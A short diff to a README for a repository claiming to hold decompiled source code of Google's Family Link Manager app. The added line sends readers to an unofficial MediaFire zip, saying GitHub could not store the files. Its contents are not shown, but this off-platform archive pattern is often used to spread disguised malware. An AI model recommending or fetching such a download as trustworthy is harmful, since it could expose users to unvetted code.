@@ -1,5 +1,7 @@
 # Family Link Manager – Decompiled Source Code
 
+## GitHub can't store all the Files. Here's another Download Link: https://www.mediafire.com/file/a9ic9ouv9s812vy/familylinkmanager.zip
+
 ## Disclaimer
 
 This repository contains decompiled source code from the **Google Family Link Manager** application.
